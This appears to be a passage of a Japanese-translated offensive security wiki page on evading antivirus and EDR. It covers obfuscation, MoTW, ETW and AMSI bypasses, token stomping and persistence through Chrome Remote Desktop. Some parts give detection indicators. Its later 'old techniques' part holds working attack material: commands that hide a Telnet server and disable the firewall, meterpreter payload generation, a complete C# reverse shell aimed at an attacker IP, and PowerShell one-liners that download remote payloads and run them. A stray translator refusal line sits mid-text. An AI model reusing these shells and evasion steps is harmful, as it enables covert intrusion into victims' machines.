- **unmanaged PowerShell session を使用する**: [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) を使うと、`powershell.exe` を起動せずに PowerShell をホストできます（Cobalt Strike の `powerpick` が使用する手法です）。この方法は `powershell.exe` プロセスに特化した制御を回避しますが、AMSI、Script Block Logging、その他すべての PowerShell 防御機能が自動的に無効になるわけではありません。カバー範囲は runtime と host の実装によって異なります。


## Obfuscation

> [!TIP]
> 複数の obfuscation 手法ではデータを暗号化するため、バイナリの entropy が増加し、AV や EDR に検知されやすくなります。注意して使用し、機密性の高いコードや隠す必要のあるコードの特定のセクションにのみ暗号化を適用することを検討してください。

### ConfuserEx で保護された .NET バイナリの Deobfuscation

ConfuserEx 2（または商用 fork）を使用した malware を解析する場合、decompiler や sandbox を妨害する複数の保護レイヤーに直面することがよくあります。以下の workflow を使うと、ほぼ**元の IL を復元**し、その後 dnSpy や ILSpy などのツールで C# に decompile できます。<sup>[[10]](#references)</sup>

1.  Anti-tampering の除去 – ConfuserEx はすべての *method body* を暗号化し、*module* の static constructor（`<Module>.cctor`）内で復号します。また、PE checksum にパッチを適用するため、変更を加えるとバイナリがクラッシュします。**AntiTamperKiller** を使用して、暗号化された metadata table を特定し、XOR key を復元して、クリーンな assembly に書き換えます:
   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   出力には、独自の unpacker を作成する際に役立つ6つの anti-tamper パラメータ（`key0-key3`、`nameHash`、`internKey`）が含まれています。

2.  シンボル / 制御フローの復元 – *clean* ファイルを **de4dot-cex**（ConfuserEx 対応の de4dot フォーク）に渡します。
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   フラグ:
     • `-p crx` – ConfuserEx 2 profileを選択
     • de4dotはcontrol-flow flatteningを解除し、元のnamespace、class、変数名を復元して、定数文字列を復号します。

3.  Proxy-call stripping – ConfuserExは、逆コンパイルをさらに妨げるため、直接のメソッド呼び出しを軽量なラッパー（別名 *proxy calls*）に置き換えます。**ProxyCall-Remover**で削除します：
   ```bash
   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   この手順の後、難読化されたラッパー関数（`Class8.smethod_10`、…）ではなく、`Convert.FromBase64String` や `AES.Create()` などの通常の .NET API が確認できるはずです。

4.  手動でクリーンアップ – 生成されたバイナリを dnSpy で実行し、大きな Base64 blob や `RijndaelManaged`／`TripleDESCryptoServiceProvider` の使用箇所を検索して、*実際の* payload を特定します。マルウェアは多くの場合、`<Module>.byte_0` 内で初期化された TLV エンコード済みのバイト配列として payload を格納しています。

この一連の手順では、悪意のあるサンプルを実行せずに実行フローを復元できます。オフラインのワークステーションで作業する際に便利です。

> 🛈  ConfuserEx は `ConfusedByAttribute` というカスタム属性を生成します。この属性は IOC として使用でき、サンプルの自動トリアージに役立ちます。

#### ワンライナー
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): このプロジェクトは、[code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>)と改ざん防止によってソフトウェアのセキュリティを高められる、[LLVM](http://www.llvm.org/)コンパイルスイートのオープンソースフォークを提供することを目的としています。
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscatorは、外部ツールを使わず、コンパイラも変更せずに、`C++11/14`言語を使ってコンパイル時に難読化コードを生成する方法を示します。
- [**obfy**](https://github.com/fritzone/obfy): C++テンプレートメタプログラミングのフレームワークで生成した難読化演算のレイヤーを追加し、アプリケーションを解析しようとする人の作業を少し難しくします。
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatrazは、.exe、.dll、.sysなど、さまざまなPEファイルを難読化できるx64バイナリobfuscatorです。
- [**metame**](https://github.com/a0rtega/metame): Metameは、任意の実行ファイルに対応するシンプルなメタモーフィックコードエンジンです。
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscatorは、ROP (return-oriented programming)を使い、LLVM対応言語を対象とした細粒度のコード難読化フレームワークです。ROPfuscatorは、通常の命令をROPチェーンに変換してアセンブリコードレベルでプログラムを難読化し、通常の制御フローに対する直感的な理解を妨げます。
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): NimcryptはNimで書かれた.NET PE Crypterです。
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptorは既存のEXE/DLLをshellcodeに変換し、読み込むことができます。

### LLVM compiler-assisted per-function self-masking

implant全体をスリープ中だけマスキングする代わりに、変更したLLVM X86 backendを使うと、選択した関数を非アクティブな間は常にXORマスキングできます。Function Peekaboo PoCは、名前をデマングルしたときに`REG_`を含む関数を選び、最終的な機械語コードの前後に位置独立のentry/exit stubを挿入し、`.text`に共有マスキングhandlerを1つ出力します。ソースレベルのシグネチャとWindows x64 calling conventionは変更されません。<sup>[[38]](#references)[[39]](#references)</sup>

#### Backend control-flow transformation

この処理は、命令選択と最適化の後に行います。変換では**出力されるすべてのreturn**を対象にし、正確なx86レイアウトを把握する必要があるためです。出力前の`MachineFunctionPass`で最後の`MachineInstr::isReturn()`を見つけ、それを削除して最終経路が追加されたepilogueへフォールスルーするようにし、それ以前のreturnは`JMP_1 handler`に置き換えます。各returnの前にある、コンパイラが生成したスタックやフレームの後処理は維持し、return命令だけを転送してください。<sup>[[38]](#references)[[39]](#references)</sup>

`X86AsmPrinter::emitFunctionBodyStart()`と`emitFunctionBodyEnd()`で関数ごとのstubを出力し、`emitEndOfAsmFile()`でhandlerを出力します。出力段階間で共有するシンボルを使えば、prologueから後に出力されるepilogueへ分岐できます。手動でnear `je`を出力する場合は、`0F 84`の後に4バイトのMC式`target - address_after_je`を書き込みます。handlerへのcallとjumpは、代わりに`MCInst`オブジェクト（`CALL64pcrel32`と`JMP_1`）として出力できます。何も変更していない未選択関数に対して、passは`false`を返す必要があります。PoCはこの経路で誤って`true`を返します。<sup>[[38]](#references)[[39]](#references)</sup>

#### Metadata and pre-CRT initialization

PoCは、XOR keyと、loaderによって再配置された関数ポインターおよび実行時の長さを含む16バイトのレコードを`.funcmeta`に配置します。Cのフィールドは`uint32_t`ですが、handlerはレコードのオフセット`+8`からQWORDを読み込み、長さとそのpaddingを消費し、レコードを`0x10`ずつ進めます。PEのセクション名は8バイトしか使えないため、実行時の検索では`.funcmet`として認識されます。外部patcherは実行可能な`.stub`を追加し、stubに元のentry-point RVAを保存して、`AddressOfEntryPoint`を変更します。PIC stubは`gs:[0x60]` → `[PEB+0x10]`からイメージベースを取得し、PE32+のimportをたどって、すでにimportされている`VirtualProtect`を解決してからCRTより先に実行されます。<sup>[[38]](#references)[[39]](#references)</sup>

初期化では`gs:[0xE8]`にsentinelを設定し、metadataにあるすべての関数を呼び出します。常に読み取り可能なprologueは、関数の開始位置を`gs:[0xF0]`に記録し、sentinelを検出すると、まだclearな本体をスキップします。次にepilogueが`call handler`を実行します。handlerが13個のregister（`0x68`バイト）を保存した後、`[rsp+0x68]`にあるreturn addressは変換された関数の末尾を指すため、`end - start`をその関数のmetadataレコードに書き込めます。すべての本体がマスキングされた後、stubはsentinelをクリアし、`ImageBase + original_entry_point_RVA`へjumpします。<sup>[[38]](#references)[[39]](#references)</sup>

通常のcallでは、prologueが同じ対称handlerを呼び出して本体をdecodeします。最終経路は追加されたepilogueへフォールスルーし、それ以前のreturnはすべて共有handlerへ直接jumpします。通常のepilogueも`call`ではなく`jmp handler`を使います。再マスキング後にhandlerの`ret`が元のcallerのreturn addressを消費するため、関数の戻り値は`RAX`に保たれます。<sup>[[38]](#references)[[39]](#references)</sup>

#### Masking primitive and analysis indicators

handlerは該当するレコードを見つけ、固定長の可視prologue（このbuildでは`0x46`バイト）をスキップし、残りの領域を`PAGE_EXECUTE_READWRITE`に変更して、各バイトにkeyの下位1バイトをXORし、その後`PAGE_EXECUTE_READ`に設定します。この同じloopで、entry時にはdecodeし、通常のexit時にはencodeします。<sup>[[38]](#references)[[39]](#references)</sup>

この設計で検出に役立つ指標は次のとおりです。<sup>[[38]](#references)[[39]](#references)</sup>

- entry pointが実行可能な`.stub`内にあり、`.funcmet`セクションにkeyと再配置済みの`.text`ポインターが格納されている。
- CRTより前にPEB、import table、section tableを解析し、その後、各metadataポインター経由でcallする。
- 同一の`call`/`pop` PIC prologueがあり、多数のreturn箇所が1つのhandlerへ転送される。
- `gs:[0xE8]`、`gs:[0xF0]`、`gs:[0xF8]`への書き込みに続き、`VirtualProtect`による保護属性の切り替えと、イメージにマップされた実行可能ページへのバイト単位のXOR書き込みが繰り返される。

これはmemory scannerの回避であり、暗号学的な保護ではありません。patch後のファイルには元のclearな本体が残っており、debuggerで`VirtualProtect`やXOR loopにbreakpointを設定すれば、実行中の関数をdumpできます。1バイトのXOR、読み取り可能なmetadata、固定の`0x46`境界も、オフラインでの復元を容易にします。<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> PoCのTEB slotはthread-localですが、変更されたコードページはprocess-wideです。そのため、並行または再帰的なentryがあると、別の呼び出しが実行中に命令の状態が再び切り替わる可能性があります。また、例外やnonlocal exitによって再マスキングがスキップされることもあります。堅牢な実装には、切り替えの同期、`lpflOldProtect`経由で返された実際の保護属性の復元、ハードコードされたstub長の回避、x64のstack alignmentに関する`call`と`jmp`経路の監査、および実行可能バイトの書き換え後の`FlushInstructionCache`呼び出しが必要です。Microsoftは、実行可能コードを変更した際のinstruction-cache coherencyを呼び出し側の責任と明確に定めています。<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen & MoTW

インターネットから実行ファイルをダウンロードして実行する際に、この画面が表示されたことがあるかもしれません。

Microsoft Defender SmartScreenは、潜在的に悪意のあるアプリケーションの実行からエンドユーザーを保護するためのセキュリティ機構です。

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreenは主にレピュテーションベースの方式で動作します。つまり、あまりダウンロードされていないアプリケーションはSmartScreenを起動させ、エンドユーザーに警告してファイルの実行を防ぎます（ただし、More Info -> Run anywayをクリックすれば実行できます）。

**MoTW** (Mark of The Web)は、Zone.Identifierという名前の[NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>)です。インターネットからファイルをダウンロードすると、そのファイルのダウンロード元URLとともに自動的に作成されます。

<figure><img src="../images/image (237).png" alt=""><figcaption><p>インターネットからダウンロードしたファイルのZone.Identifier ADSを確認する。</p></figcaption></figure>

> [!TIP]
> **信頼された**署名証明書で署名された実行ファイルでは、**SmartScreenは起動しない**ことに注意してください。

payloadにMark of The Webが付くのを防ぐ非常に効果的な方法は、ISOなどのコンテナーに格納することです。これは、Mark-of-the-Web (MOTW)を**NTFS以外**のボリュームには適用**できない**ためです。

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/)は、Mark-of-the-Webを回避するためにpayloadを出力コンテナーに格納するツールです。

使用例：

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

こちらは、[PackMyPayload](https://github.com/mgeeky/PackMyPayload/) を使って ISO ファイルに payloads をパッケージ化し、SmartScreen を bypass するデモです。

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) は、アプリケーションやシステムコンポーネントが**イベントをログに記録**できる、Windows の強力なログ記録メカニズムです。ただし、セキュリティ製品が悪意のあるアクティビティを監視・検出するために使うこともできます。

AMSI を無効化（bypass）するのと同様に、ユーザー空間プロセスの **`EtwEventWrite`** 関数を、イベントをログに記録せず即座に return するようにすることもできます。これは、メモリ内の関数にパッチを適用して即座に return させることで、そのプロセスの ETW ログ記録を実質的に無効化します。

詳しくは **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) と [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)** を参照してください。<sup>[[33]](#references)[[34]](#references)</sup>


## C# アセンブリリフレクション

C# バイナリをメモリ内に読み込む手法は以前から知られており、AV に検知されずに post-exploitation ツールを実行する非常に優れた方法として、今も使われています。

payload はディスクに触れることなく直接メモリに読み込まれるため、プロセス全体で AMSI にパッチを適用することだけを考慮すればよくなります。

ほとんどの C2 フレームワーク（sliver、Covenant、metasploit、CobaltStrike、Havoc など）には、C# アセンブリを直接メモリ内で実行する機能がすでにありますが、その方法はいくつかあります。

- **Fork\&Run**

**新しい使い捨てプロセスを起動**し、そのプロセスに post-exploitation の悪意あるコードを inject して実行し、完了したら新しいプロセスを kill する方法です。この方法にはメリットとデメリットがあります。fork and run 方式のメリットは、実行が Beacon implant プロセスの**外部**で行われることです。つまり、post-exploitation の動作中に問題が発生したり検知されたりした場合でも、**implant が生き残る可能性が大幅に高くなります。**一方で、**Behavioural Detections** に検知される**可能性は高くなります。**

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

post-exploitation の悪意あるコードを**自身のプロセス内に** inject する方法です。これにより、新しいプロセスを作成して AV のスキャンを受けることを避けられます。一方で、payload の実行中に問題が起きると、クラッシュする可能性があるため、**beacon を失う可能性が大幅に高くなります。**

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> C# Assembly の読み込みについて詳しく知りたい場合は、こちらの記事 [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) と InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly)) を確認してください。

C# Assemblies は **PowerShell から**読み込むこともできます。[Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) と [S3cur3th1sSh1t の動画](https://www.youtube.com/watch?v=oe11Q-3Akuk)を確認してください。

## .NET ツールを NativeAOT WebAssembly に再パッケージ化する（WasmForge）

通常の `execute-assembly` 手法では、認識可能な MSIL が残り、最終的に CLR が初期化されます。**WasmForge** は実行基盤そのものを変更します。C# プロジェクトを実験的な NativeAOT-LLVM WASI ターゲットに移行し、事前に WebAssembly にコンパイルしたうえで、そのモジュールを Wazero ベースの Windows PE ホストに埋め込みます。生成されたプロセスは対象の CLR、JIT、`dotnet` ホストを必要としないため、マネージドアセンブリ名、CLR の読み込み、AMSI、.NET ETW のみに基づくルールでは直接可視性が失われます。これは evasion/パッケージ化手法であり、権限境界の bypass ではありません。guest は元のツールと同じ権限を持ち、OS 上での動作も観測可能です。<sup>[[44]](#references)[[45]](#references)</sup>

### C# プロジェクトのビルド

推奨されるビルド方法は、.NET 10 SDK、NativeAOT-LLVM workload、WASI SDK 24.0、linker、署名に必要な依存関係が含まれる、プロジェクトの Docker 環境を使うことです。`.csproj` は自動検出され、ワンショットのビルドで移行、互換性パッチの適用、WASM コンパイル、PE の生成、署名が実行されます。<sup>[[45]](#references)</sup>

```bash
# From the WasmForge repository
make docker-build
make docker-run DOCKER_SRC=/path/to/Seatbelt DOCKER_PROJECT=seatbelt

# Equivalent direct build when all prerequisites are installed
GOOS=windows GOARCH=amd64 ./wasmforge build --win32-apis \
  -o seatbelt.exe /path/to/Seatbelt/Seatbelt/
```

トラブルシューティングや生成されたコードのレビューでは、処理を `wasmforge dotnet-migrate <dir>`、`wasmforge dotnet-patch <dir>`、`dotnet publish -c Release -r wasi-wasm`、最後に `wasmforge build --wasm <module> --nativeaot --win32-apis -o <output.exe>` に分けます。ビルドイメージでは、WASI Preview 2 の component encoding を避け、埋め込みランタイムが想定するプレーンなモジュールを生成するために、`wasm-component-ld` ラッパーも使用します。<sup>[[44]](#references)[[45]](#references)</sup>

### wasm32 C# と x64 Win32 のブリッジ

これは透過的な再コンパイルではありません。NativeAOT-WASI では Windows 向けの BCL 機能が利用できないか、変更されており、wasm32 のゲストでは通常、4 バイトのポインタスロットが割り当てられる一方、x64 API は 8 バイトのポインタを返すことがあります。WasmForge は、以下の生成レイヤーによって両方の問題に対処します。<sup>[[44]](#references)</sup>

1. ソースパッチャーが AOT 固有のセマンティクスの違いを修正し、サポートされていないレジストリ、パイプ、WMI、ID、ディレクトリサービス、ファイルバージョン、LSA などの呼び出しを `Wf*` ヘルパーにリダイレクトします。
2. P/Invoke スキャナーが NativeAOT `DirectPInvoke` マッピングを出力し、`[DllImport]` 呼び出しがゲスト内で宣言された DLL を動的に読み込むのではなく、リンクされた C ブリッジシンボルにバインドされるようにします。
3. ホストに渡すポインタには、C# では `ulong`、C では `uint64_t` を使用します。汎用ディスパッチャーが呼び出しをホストの Win32 ハンドラーに転送します。`out8_mask` は、上位 4 バイトを保持する必要がある、実際の 8 バイト出力スロットを示します。マークされていない wasm32 形式の出力には、スナップショットと復元による保護を適用し、x64 による書き込みで隣接する 4 バイトが破損しないようにします。
4. 汎用 syscall ディスパッチに適さない処理には、専用のホストブリッジを使用します。たとえば、LSA チケットキャッシュへのアクセス、構造化された結果を返す Kerberos/BCrypt 操作、TCP による KDC 通信、LDAP クエリなどです。

たとえば、`version.dll!VerQueryValueW` のラッパーは 4 つのホストアドレスを渡し、値ポインタと長さが 8 バイトの出力スロットであるため、ビット 2 と 3（`0xC`）を設定します。ラッパー自体は汎用のままで、DLL 名、エクスポート名、引数、マスクを `wf_call_v2` に渡します。ホストがポインタを変換し、ネイティブ API を呼び出します。<sup>[[44]](#references)</sup>

```c
uint32_t version_VerQueryValueW_v2(uint64_t block, uint64_t subblock,
    uint64_t value_out, uint64_t length_out) {
    return (uint32_t)wf_call_v2("version.dll", "VerQueryValueW", 4,
        0xC, block, subblock, value_out, length_out);
}
```

### 制限事項と検知の着眼点

Reflection-heavyなコード、動的なアセンブリ読み込み、任意のネイティブコールバック、WASMメモリに返される複雑なx64構造体には、ツールごとのパッチが必要になる場合や、まったく動作しない場合があります。汎用WASI Preview 2ソケットもno-opスタブに到達する可能性があるため、対応ツールではプロトコル固有のhost shimを使用します。機能が同等だと決めつけず、各コマンドをネイティブビルドと照合して検証してください。<sup>[[44]](#references)[[45]](#references)</sup>

この手法はpayloadを不可視にするのではなく、テレメトリの対象を変えます。検知の着眼点は、WASMモジュールを含む、または実体化するPE、Wazeroのようなランタイムの挙動、通常とは異なるhost/guest間のメモリ確保とコピー、汎用的な直接Win32ディスパッチ、署名やPEリソースの異常、さらにそれに続くAPI呼び出しやネットワークトラフィックに移る可能性があります。そのため、CLR-load、AMSI、.NET ETWイベントがないことを、プロセスが無害である証拠として扱うべきではありません。<sup>[[44]](#references)</sup>

## 他のプログラミング言語の使用

[**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins)で提案されているように、侵害したマシンから**攻撃者が管理するSMB共有にインストールされたインタープリター環境**にアクセスできるようにすることで、他の言語を使って悪意のあるコードを実行できます。

SMB共有上のインタープリターバイナリと環境へのアクセスを許可すれば、侵害したマシンの**メモリ内でこれらの言語による任意のコードを実行**できます。

リポジトリによると、Defenderは引き続きスクリプトをスキャンしますが、Go、Java、PHPなどを利用することで、**静的シグネチャを回避する柔軟性が高まります**。これらの言語で難読化していないリバースシェルスクリプトをランダムに試したところ、成功しています。

## 静的解析回避のためのWebAssembly再ホスティング

<a id="bridging-linear-memory-to-native-apis"></a>
<a id="per-build-wasm-vm-polymorphism"></a>
<a id="camouflaging-the-outer-go-executable"></a>

{{#ref}}
virtualized-payload-execution.md#webassembly-re-hosting-for-static-analysis-evasion
{{#endref}}

## TokenStomping

Token stompingは、EDRやAVなどのセキュリティ製品のアクセストークンを操作します。トークンの権限を下げると、プロセスを実行状態に保ちながら、特権を必要とする検査や修復の操作を妨げられる場合があります。

これを防ぐため、Windowsはセキュリティプロセスのトークンに対するハンドルを、**外部プロセスが取得できない**ようにできます。

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## 信頼されたソフトウェアの使用

### Chrome Remote Desktop

[**このブログ記事**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)で説明されているように、被害者のPCにChrome Remote Desktopを導入して乗っ取り、永続化を維持するのは簡単です。<sup>[[35]](#references)</sup>
1. https://remotedesktop.google.com/ からダウンロードし、「Set up via SSH」をクリックしてから、Windows用のMSIファイルをクリックしてダウンロードします。
2. 被害者の環境でインストーラーをサイレント実行します（管理者権限が必要です）。`msiexec /i chromeremotedesktophost.msi /qn`
3. Chrome Remote Desktopのページに戻り、「次へ」をクリックします。ウィザードで承認を求められるので、「Authorize」ボタンをクリックして続行します。
4. 必要な箇所を調整して、提示されたコマンドを実行します。`"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111`（`--pin`パラメーターを使うと、GUIを使わずにPINを設定できます）。
 

## 高度な回避

{{#ref}}
virtualized-payload-execution.md
{{#endref}}

回避は非常に複雑なテーマです。1つのシステム内でも、多くの異なるテレメトリソースを考慮しなければならないことがあり、成熟した環境で完全に検知を免れるのは、ほぼ不可能です。

対峙する環境ごとに、それぞれ独自の長所と短所があります。

より高度な回避手法の足がかりを得るために、[@ATTL4S](https://twitter.com/DaniLJ94)のこの講演を見ることを強くお勧めします。


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

こちらも、[@mariuszbit](https://twitter.com/mariuszbit)による、Evasion in Depthについての素晴らしい講演です。


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **古い手法**

### **Defenderが悪意のあるものと判定する部分を特定する**

[**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck)を使うと、**Defenderが悪意のあるものと判定する箇所を特定するためにバイナリの一部を削除し**、その部分を切り出せます。\
**同じことを行う別のツールは**[**avred**](https://github.com/dobin/avred)です。サービスは[**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)で公開されています。

### **Telnet Server**

Windows10以前のすべてのWindowsには、管理者としてインストールできる**Telnetサーバー**が付属していました。次のように実行します。

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

システム起動時に**開始**し、今すぐ**実行**する：

```bash
sc config TlntSVR start= auto obj= localsystem
```

**telnetポートを変更（ステルス）し、ファイアウォールを無効化する：**

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

この内容には、被害者端末への隠密なリモート接続を設定する手順が含まれるため、翻訳には対応できません。正規の管理用途向けに、ユーザーの同意や可視性を保つ手順であれば翻訳できます。

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

GreatSCT 内部:

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

次に、`msfconsole -r file.rc`で**listerを起動**し、以下で**xml payloadを実行**します:

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**現在の defender はプロセスをすぐに終了させます。**

### 独自の reverse shell をコンパイルする

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### 最初の C# Revershell

以下の方法でコンパイルします：

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

次のものと一緒に使用します:

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### C# コンパイラを使用する

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

自動ダウンロードと実行：

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# obfuscatorsの一覧: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### injector構築にPythonを使用する例:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### その他のツール

```bash
